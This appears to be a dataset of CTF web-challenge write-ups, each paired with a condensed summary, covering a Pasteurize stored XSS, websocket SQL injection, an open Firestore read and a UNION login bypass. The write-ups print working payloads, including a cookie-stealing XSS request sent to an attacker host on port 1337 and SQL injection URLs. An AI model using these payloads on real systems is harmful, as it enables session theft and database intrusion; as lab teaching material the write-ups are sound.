  res.set(""Content-type"", ""text/plain; charset=utf-8"");
  res.sendFile(__filename);
});

/* Let it begin! */
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});

module.exports = app;
```

The service is similar to [Pastebin](https://pastebin.com/), you can create a message that will be stored with an ID and then you can share it with *TJMike*. Analyzing the page of a created message, e.g. `https://pasteurize.web.ctfcompetition.com/512e9209-ac7f-452f-bce9-34c6f780cc6b`, you can find an interesting comment.

```html
<!DOCTYPE html>
<html>

<head>
    <link href=""/static/styles/style.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""/static/styles/bootstrap.css"">
    <script src=""/static/scripts/dompurify.js""></script>
    <script src=""/static/scripts/captcha.js""></script>
</head>

<body>
    <nav class=""navbar navbar-expand-md navbar-light bg-light"">
    <div class=""collapse navbar-collapse mr-auto"">
        <a href=""/"" class=""navbar-brand"">Pasteurize</a>
    </div>
</nav>
    
  
    <div class=container>
        <div class=""container pt-5 w-75"">

            <div class=card>
                <div class=""card-header"">
                    <a id=""note-title"" class=""card-title""></a>
                </div>
                <div class=""card-body"">
                    <div id=""note-content""></div>
                </div>


                <ul class=""list-group list-group-flush"">
                    <li class=""list-group-item p-0"">
                        <form action=""/report/512e9209-ac7f-452f-bce9-34c6f780cc6b"" method=""POST"" class=""form row"">
                            <script src=""//www.google.com/recaptcha/api.js?render=6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt&hl=en""></script><script>grecaptcha.ready(function(){grecaptcha.execute('6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt', {action: 'homepage'}).then(captcha_cb);});</script>
                            <button type=""submit"" class=""btn btn-link col-md-6 border-right"">share with TJMike🎤</button>
                            <button type=""button"" id=back class=""btn btn-link col-md-6"">back</button>
                        </form>
                    </li>
                </ul>

            </div>
            <br>
            <div id=""alert-container"" class=""card"">
                <div id=""alert"" class=""card-body""></div>
            </div>
        </div>
    </div>

    <!-- TODO: Fix b/1337 in /source that could lead to XSS -->
    
    <script>
        const note = ""asd qwert 123"";
        const note_id = ""512e9209-ac7f-452f-bce9-34c6f780cc6b"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>

    <script>
        const msg = (new URL(location)).searchParams.get('msg');
        const back = document.getElementById('back');
        const alert_div = document.getElementById('alert');
        const alert_container = document.getElementById('alert-container');
        back.onclick = () => history.back();
        if (msg) {
            alert_div.innerText = msg;
            alert_container.style.display = ""block"";
            setTimeout(() => {
                alert_container.style.display = ""none"";
            }, 4000);
        }
    </script>
</body>

</html>
```

So the exploitation process should involve the creation of a Stored XSS that must be shared with *TJMike* in order to exfiltrate session cookies.

An interesting snippet can be here, where the `escape_string` method is called.

```javascript
/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send(""Paste not found or access has been denied."");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});
```

The method definition is the following.

```javascript
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

The content of the note is reflected here in the source code, then inserted into the HTML.

```html
    <script>
        const note = ""asd qwert 123"";
        const note_id = ""512e9209-ac7f-452f-bce9-34c6f780cc6b"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

In the HTML is inserted after the `DOMPurify.sanitize` method, so the XSS must be triggered before.

Using double quotes to try to close the constant, i.e. `""; alert(); ""`, will fail.

```html
    <script>
        const note = ""\""; alert(); \"""";
        const note_id = ""0021ca75-bd21-4fab-8b0a-63c565119611"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

Trying to escape their escape, i.e. `\"";alert();//`, will not work.

```html
    <script>
        const note = ""\\\"";alert();//"";
        const note_id = ""2ee33611-6108-4ec0-92dd-cc948e2b7aa6"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

The presence of the following snippet means that you can POST ""nested object"", because `extended` is `true`.

```javascript
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

So a request like the following can be crafted.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[foo]=aaa
```

The result produced will be the following.

```html
    <script>
        const note = """"foo"":""aaa"""";
        const note_id = ""58866002-84e1-42c4-b7fe-82e58a527b6a"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

So the JavaScript `const` can be altered, closing the string and inserting arbitrary JavaScript.

A working XSS can be obtained with the following payload.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[;alert();//]=pwn
```

The result will be the following.

```html
    <script>
        const note = """";alert();//"":""pwn"""";
        const note_id = ""837822b4-0fc7-4137-ae64-c0881c6164fb"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

At this point it is sufficient to have a listening host with `nc -lkv 1337`.

A request like the following can be crafted.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[;document.location='http://x.x.x.x:1337?c='%2Bdocument.cookie;//]=pwn
```

The result will be the following. 

```
    <script>
        const note = """";document.location='http://x.x.x.x:1337?c='+document.cookie;//"":""pwn"""";
        const note_id = ""32049c5d-b00d-46a8-bb5f-b600d4f46e39"";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

To bypass problems with reCAPTCHA, it is sufficient to create another note and to change the HTML source, in order to signal it to TJMike passing the previous, malicious, `note_id`.

```
user@host:~$ nc -lkv 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 51.55.155.104.bc.googleusercontent.com 38470 received!
GET /?c=secret=CTF{Express_t0_Tr0ubl3s} HTTP/1.1
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Host: 52.47.121.145:1337
Via: 1.1 infra-squid (squid/3.5.27)
X-Forwarded-For: 35.233.52.193
Cache-Control: no-cache
Connection: keep-alive
```

The flag is the following.

```
CTF{Express_t0_Tr0ubl3s}
```","Connecting to the website and analyzing the HTML you can find a link to a js script.

Connecting to `source` endpoint will reveal the following.

[Javascript code that sets up a web server using the Express.js framework. The server provides various routes for handling HTTP requests, such as serving static files, rendering HTML templates, and interacting with a Google Cloud Datastore to store and retrieve notes. It also uses various middleware functions to parse request bodies, handle reCAPTCHA challenges, and handle caching.]

The service is similar to Pastebin, you can create a message that will be stored with an ID and then you can share it. Analyzing the page of a created message, you can find an interesting comment.

So the exploitation process should involve the creation of a Stored XSS in order to exfiltrate session cookies.

An interesting snippet can be here, where the `escape_string` method is called.

[Javascript code defining a route for an Express.js web application that retrieves a note from a database based on its ID, escapes the note's content to prevent cross-site scripting (XSS) attacks, and renders the note's content in a view along with a CAPTCHA.]

The method definition is the following.

[JavaScript function that takes a string and escapes any HTML angle brackets it contains, by replacing them with the corresponding Unicode escape sequences using the backslash-x notation.]

The content of the note is reflected here in the source code, then inserted into the HTML.

In the HTML is inserted after the `DOMPurify.sanitize` method, so the XSS must be triggered before.

Using double quotes to try to close the constant, i.e. `""; alert(); ""`, will fail.

Trying to escape their escape, i.e. `\"";alert();//`, will not work.

The presence of the following snippet means that you can POST ""nested object"", because `extended` is `true`.

[JavaScript code that configures the Express app to use the bodyParser middleware to parse incoming URL-encoded form data with the ""extended"" option set to ""true"".]

So a request like the following can be crafted.

[HTTP POST request with various headers and a payload in the form of URL-encoded key-value pairs.]

The result produced will be the following.

[HTML script that declares a JavaScript variable ""note"" containing a JSON-like string, sets a variable ""note_id"" to a UUID, gets two HTML elements by their IDs, sanitizes ""note"" using the DOMPurify library, sets the innerHTML property of one element to the sanitized ""note"" and the href and innerHTML properties of the other element to ""/{note_id}"" and ""{note_id}"", respectively.]

So the JavaScript `const` can be altered, closing the string and inserting arbitrary JavaScript.

A working XSS can be obtained with the following payload.

[HTTP POST request with form data that includes a payload in the ""content"" field containing the string "";alert();//"".]

The result will be the following.

[HTML script element containing JavaScript code that retrieves a note with a specific ID and populates the content of a web page element with the note's sanitized contents, and updates the href and innerHTML properties of another web page element to display the note ID and link to the note's URL.]

At this point it is sufficient to have a listening host with `nc -lkv 1337`.

A request like the following can be crafted.

[HTTP POST request headers and body with form data containing a JavaScript code that aims to exploit a vulnerability in a web application by sending the user's cookie information to an attacker-controlled server.]

The result will be the following. 

[JavaScript code that sets a cookie and sends it to an IP address on port 1337. It also retrieves an element by ID and sets its innerHTML to the sanitized value of a variable named ""note"", and sets the href and innerHTML of another element to a specific note ID.]

To bypass problems with reCAPTCHA, it is sufficient to create another note and to change the HTML source, in order to signal it to TJMike passing the previous, malicious, `note_id`.

[Terminal output showing the flag.]"
"# Houseplant CTF 2020 – Blog from the future

* **Category:** web
* **Points:** 1922

## Challenge

> My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it's secure like he assured me it is?
> 
> http://challs.houseplant.riceteacatpanda.wtf:30003
> 
> Dev: jammy

## Solution

A post in the home page says the following.

```
I finally upgraded my blog to use the tech of the future! I'm now using state of the art protection to defend from those pesky spammers... however, I still have to replace my database software to be truly able to call my blog ""futuristic"". :/
```

Doing some recon, the following file can be found: `http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt`.

```
User-Agent: *
Disallow: /admin
```

So you can discover an administration page at `http://challs.houseplant.riceteacatpanda.wtf:30003/admin`.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Bob&#39;s Socket Reviews Administrative Panel</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
    <link rel='stylesheet' href='/stylesheets/admin.css' />
  </head>
  <body>
    <a href=""#home""><h1>Bob&#39;s Socket Reviews Administrative Panel</h1></a>
    <hr />
    
    <form method=""POST"">
        <input type=""text"" name=""username"" placeholder=""Username"" />
        <input type=""password"" name=""password"" placeholder=""Password"" />
        <!-- I've replaced the password with a one-time TOTP token, but the evil hackers don't need to know that... >:)
        <input type=""password"" name=""totp"" placeholder=""One-time TOTP token"" /> -->
        <input type=""submit"" value=""Log in"" />
    </form>
  </body>
</html>
```

Despite the interesting HTML comment, even changing the input field from `password` to `totp` will show that the authentication form is not vulnerable to SQL injection.

You can only discover that the username is `bob`, because for nonexistent user, the authentication answers `User not found`, otherwise it answers `Login failed`.

Analyzing the websockets traffic, you can discover that posts are retrieved with a packet like the following.

![websockets-traffic.png](websockets-traffic.png)

The second part of the packet is the post ID passed using the value specified like URL fragment (i.e. after `#`). 

Analyzing the code in the client side, you can discover that 6 parameters are read form the server response:
* `author`;
* `hidden`, this value seems interesting, because now we know that hidden posts are present;
* `id`;
* `postDate`;
* `text`;
* `title`.

![client-code.png](client-code.png)

You can try a SQL injection on data passed using fragment values.

```
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,null,null,null
```

Users can be read with the following.

```
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users
```

And the flag can be discovered reading all posts.

```
http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts
```

![sqli.png](sqli.png)

The flag is the following.

```
rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}
```","A post in the home page says the following.

```
I finally upgraded my blog to use the tech of the future! I'm now using state of the art protection to defend from those pesky spammers... however, I still have to replace my database software to be truly able to call my blog ""futuristic"". :/
```

Doing some recon, a robots.txt can be found.

So you can discover an administration page at `/admin` endpoint.

Despite the interesting HTML comment, even changing the input field from `password` to `totp` will show that the authentication form is not vulnerable to SQL injection.

You can only discover that the username is `bob`, because for nonexistent user, the authentication answers `User not found`, otherwise it answers `Login failed`.

Analyzing the websockets traffic, you can discover that posts are retrieved with a packet like the following.

The second part of the packet is the post ID passed using the value specified like URL fragment (i.e. after `#`). 

Analyzing the code in the client side, you can discover that 6 parameters are read form the server response:

You can try a SQL injection on data passed using fragment values.

[URL containing SQL code injection attempt, trying to union select null values from a database table.]

Users can be read with the following.

[URL that may be used to perform a SQL injection attack by attempting to retrieve information from a database. The URL contains a union select statement that is used to combine information from two or more database tables.]

And the flag can be discovered reading all posts.

[URL containing a SQL injection attack payload that selects certain data from a ""posts"" table in a database.]"
"# Houseplant CTF 2020 – Fire/place

* **Category:** web
* **Points:** 1783

## Challenge

> You see, I built a nice fire/place for us to all huddle around. It's completely decentralized, and we can all share stuff in it for fun!!
> 
> Dev: Jess
>
> Hint! I wonder... what's inside the HTML page?
>
> fire-place[0].html e4a4c2321d18246d027184605ca52866

## Solution

The challenge gives you an [HTML file](fire-place[0].html) which connects to a Firestore environment.

```html
<body>
    <div class=""column"" style=""float: left; width:1000;"">
        <canvas id=""myCanvas"" style=""width: 1000px; height: 650px;""></canvas>
    </div>
    <div class=""column"" style=""float: right; width: 300;"">
        <br>
        <h1 style = ""font-family:georgia,garamond,serif;font-size:20px;"">Welcome to fire/place!</h1>
        <br>
        <script src=""https://rawgit.com/EastDesire/jscolor/master/jscolor.js""></script>
        <input class=""jscolor"" id=colour value=""f0f0f0"">
        <br><br>
        X:<input class=""text"" id=xpos value=0>
        <br>
        Y:<input class=""text"" id=ypos value=0>
        <br><br>
        X offset:  <input class=""text"" id=xoff value=-1>
        <br>Y offset:  <input class=""text"" id=yoff value=-8>
    </div>
    <script src=""https://www.gstatic.com/firebasejs/7.8.2/firebase-app.js""></script>
    <script src=""https://www.gstatic.com/firebasejs/7.8.2/firebase-firestore.js""></script>
    <script src=""https://www.gstatic.com/firebasejs/7.8.2/firebase-analytics.js""></script>

    <script>
    var firebaseConfig = {
        apiKey: ""AIzaSyABDa1gqWZhFy-3OQ664XplH65TNVXfm6E"",
        authDomain: ""jade-adventure-274923.firebaseapp.com"",
        projectId: ""jade-adventure-274923"",
        storageBucket: ""jade-adventure-274923.appspot.com"",
        messagingSenderId: ""891770626123"",
        appId: ""1:891770626123:web:70414772b58fceaa88edce"",
        measurementId: ""G-GZPE7S1WJ0""
    };
    firebase.initializeApp(firebaseConfig);
    firebase.analytics();
    const db = firebase.firestore()
    </script>
</body>

<script>
    var PIXELARRAY=new Array()

    function hexToRgb(hex) {
        var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
        return result ? {
            r: parseInt(result[1], 16),
            g: parseInt(result[2], 16),
            b: parseInt(result[3], 16)
        } : null;
    }

    function sendTHEPIXEL() {
        var loc = (parseInt(document.getElementById(""ypos"").value*100))+parseInt(document.getElementById(""xpos"").value)
        converted=hexToRgb(document.getElementById(""colour"").value)
        finstring=""rgb(""+converted.r+"",""+converted.g+"",""+converted.b+"")""
        PIXELARRAY[loc]=finstring
        var docdata= {
            dat:PIXELARRAY
        };
        db.collection(""board"").doc(""data"").update(docdata)
    }

    function findScreenCoords(mouseEvent)  {
        var xpos;
        var ypos;
        if (mouseEvent) {
            //FireFox
            xpos = mouseEvent.screenX;
            ypos = mouseEvent.screenY;
        } else {
            //IE
            xpos = window.event.screenX;
            ypos = window.event.screenY;
        }
        if (Math.floor(xpos/10) >= 101) and ((Math.floor(ypos/10)-7) <= 66); {
            document.getElementById(""xpos"").value=(Math.floor(xpos/10)+parseInt(document.getElementById(""xoff"").value))
            document.getElementById(""ypos"").value=(Math.floor(ypos/10)+parseInt(document.getElementById(""yoff"").value))
            sendTHEPIXEL()
        }
    }

    function drawCanvas(pixelData){
        var c = document.getElementById(""myCanvas"");
        c.width = 1000;
        c.height = 650;
        var ctx = c.getContext(""2d"");
        
        x=0
        y=0
        for (var i=0; i<6500; i++) {
            ctx.fillStyle = pixelData[i];
            ctx.fillRect(x*10, y*10, 10, 10);
            x++
            if (x==100) {
                x=0
                y++
            }
        }        
    }
</script>
<script>
    document.addEventListener(""click"", findScreenCoords);
    db.collection(""board"").doc(""data"")
    .onSnapshot(function(doc) {
        drawCanvas(doc.data().dat);
        PIXELARRAY=doc.data().dat;
    });
</script>
```

The application allows you to color pixels on a canvas shared with other users, storing data into Firestore repository.

To interact with Firebase installation you can use the browser console.

Analyzing the client source code and reading the [official documentation](https://firebase.google.com/docs/firestore/query-data/get-data), you can discover that data of a document can be retrieved with the following snippet.

```javascript
db.collection(""board"").doc(""data"").get().then(function(doc) {
    if (doc.exists) {
        console.log(""Document data:"", doc.data());
    } else {
        console.log(""No such document!"");
    }
}).catch(function(error) {
    console.log(""Error getting document:"", error);
});
```

The retrieved data will be a structure with all the RGB values for pixels.

```javascript
Document data: Object { dat: (3929) […] }
```

You can try a document called `flag`.

```javascript
db.collection(""board"").doc(""flag"").get().then(function(doc) {
    if (doc.exists) {
        console.log(""Document data:"", doc.data());
    } else {
        console.log(""No such document!"");
    }
}).catch(function(error) {
    console.log(""Error getting document:"", error);
});
```

And you will get [the lyrics of a famous song](https://www.youtube.com/watch?v=dQw4w9WgXcQ) and the flag.

```javascript
Document data: 
Object { ""Never gonna give you up"": ""We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  And if you ask me how I'm feeling Don't tell me you're too blind to see  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you ​ (Ooh give you up) (Ooh give you up) (Ooh) Never gonna give, never gonna give (give you up) (Ooh) Never gonna give, never gonna give (give you up)  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you"", ""flag!!!!!!!!!!!!!"": ""rtcp{d0n't_g1ve_us3rs_db_a((3ss}"" }
```

So the flag is the following.

```
rtcp{d0n't_g1ve_us3rs_db_a((3ss}
```","The challenge gives you an HTML file which connects to a Firestore environment.

[HTML code containing a webpage with a canvas element, two columns of input fields and buttons, and a script to send and receive data to/from a Firebase database.]

The application allows you to color pixels on a canvas shared with other users, storing data into Firestore repository.

To interact with Firebase installation you can use the browser console.

Analyzing the client source code and reading the official documentation, you can discover that data of a document can be retrieved with the following snippet.

[JavaScript code that retrieves a document named ""data"" from a collection named ""board"" in a database, checks if it exists, and logs the retrieved data or an error message to the console.]

The retrieved data will be a structure with all the RGB values for pixels.

You can try a document called `flag`.

[JavaScript code that retrieves a document from a Firestore database collection named ""board"" and with a document ID of ""flag"". If the document exists, it logs the document data to the console; otherwise, it logs ""No such document!"". If an error occurs while retrieving the document, it logs the error to the console.]

And you will get the flag."
"# Houseplant CTF 2020 – I don't like needles

* **Category:** web
* **Points:** 50

## Challenge

> They make me SQueaL!
> 
> http://challs.houseplant.riceteacatpanda.wtf:30001
> 
> Dev: Tom

## Solution

The name of the challenge seems to be related to SQL injection.

The webpage contains an authentication form. The HTML source contains an interesting comment.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class=""container"">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    
    <form method=""POST"">
        <span>Username: </span><input type=""text"" name=""username"">
        <br>
        <br>
        <span>Password: </span><input type=""password"" name=""password"">
        <br>
        <br>
        <input type=""submit"">
    </form>
    </div>

</body>
</html>
```

Connecting to `http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce` webpage you can read the source code.

```php
<?php

    // error_reporting(0);

    if (isset($_GET['sauce'])) {
        show_source(""index.php"");
        die();
    }

?>

<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class=""container"">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <?php

        if ($_SERVER['REQUEST_METHOD'] == ""POST"") {
            
            require(""config.php"");

            if (isset($_POST[""username""]) && isset($_POST[""password""])) {

                $username = $_POST[""username""];
                $password = $_POST[""password""];

                if (strpos($password, ""1"") !== false) {
                    echo ""<p style='color: red;'>Auth fail :(</p>"";
                } else {

                    $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                    $result = mysqli_query($connection, ""SELECT * FROM users WHERE username='"" . $username . ""' AND password='"" . $password . ""'"", MYSQLI_STORE_RESULT);
                    
                    if ($result === false) {
                        echo ""<p style='color: red;'>I don't know what you did but it wasn't good.</p>"";
                    } else {
                        if ($result->num_rows != 0) {
                            if (mysqli_fetch_array($result, MYSQLI_ASSOC)[""username""] == ""flagman69"") {
                                echo ""<p style='color: green;'>"" . $FLAG . "" :o</p>"";
                            } else {
                                echo ""<p style='color: green;'>Logged in :)</p>"";
                            }
                        } else {
                            echo ""<p style='color: red;'>Auth fail :(</p>"";
                        }
                    }
                    
                }
            }
        }

    ?>

    <form method=""POST"">
        <span>Username: </span><input type=""text"" name=""username"">
        <br>
        <br>
        <span>Password: </span><input type=""password"" name=""password"">
        <br>
        <br>
        <input type=""submit"">
    </form>
    </div>

</body>
</html>
```

Authenticating with username `flagman69` should print the flag. The query is concatenating strings, so the website is vulnerable to SQL injection.

An additional control is present at the beginning on password value passed: a `strpos` function is used to check if the password contains the char `1`.

Trying to bypass the password check with a SQL injection will not print the flag after a correct login, maybe the user is not present.

```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1

username=flagman69&password='+OR+'2'='2

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:55:14 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 757
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class=""container"">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <p style='color: green;'>Logged in :)</p>
    <form method=""POST"">
        <span>Username: </span><input type=""text"" name=""username"">
        <br>
        <br>
        <span>Password: </span><input type=""password"" name=""password"">
        <br>
        <br>
        <input type=""submit"">
    </form>
    </div>

</body>
</html>
```

Using the `UNION` clause you can discover that the `users` table has 3 columns and the second returned is the one with `username`. So the final UNION SQL injection can be crafted passing directly the value to bypass the last check: `flagman69` username.

```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1

username=m3ssap0&password='+UNION+SELECT+2,'flagman69',3+#

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:57:59 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 789
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class=""container"">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <p style='color: green;'>rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t} :o</p>
    <form method=""POST"">
        <span>Username: </span><input type=""text"" name=""username"">
        <br>
        <br>
        <span>Password: </span><input type=""password"" name=""password"">
        <br>
        <br>
        <input type=""submit"">
    </form>
    </div>

</body>
</html>
```

So the flag is the following.

```
rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t}
```","The name of the challenge seems to be related to SQL injection.

The webpage contains an authentication form. The HTML source contains an interesting comment.

Connecting to `/?sauce` endpoint you can read the source code.

Authenticating with username `flagman69` should print the flag. The query is concatenating strings, so the website is vulnerable to SQL injection.

An additional control is present at the beginning on password value passed: a `strpos` function is used to check if the password contains the char `1`.

Trying to bypass the password check with a SQL injection will not print the flag after a correct login, maybe the user is not present.

Using the `UNION` clause you can discover that the `users` table has 3 columns and the second returned is the one with `username`. So the final UNION SQL injection can be crafted passing directly the value to bypass the last check: `flagman69` username.

So we get the flag."
"# Houseplant CTF 2020 – QR Generator

* **Category:** web
* **Points:** 50

## Challenge

> I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?
> 
> http://challs.houseplant.riceteacatpanda.wtf:30004
> 
> Dev: jammy
>
> Hint! For some reason, my website isn't too fond of backticks...

## Solution

The hint suggests a RCE.

Analyzing the HTML source code, an interesting comment can be found.

```html
<html>

<head>
  <title>QR Code Generator</title>
  <link rel=""stylesheet"" href=""/stylesheets/style.css"">
</head>

<body>
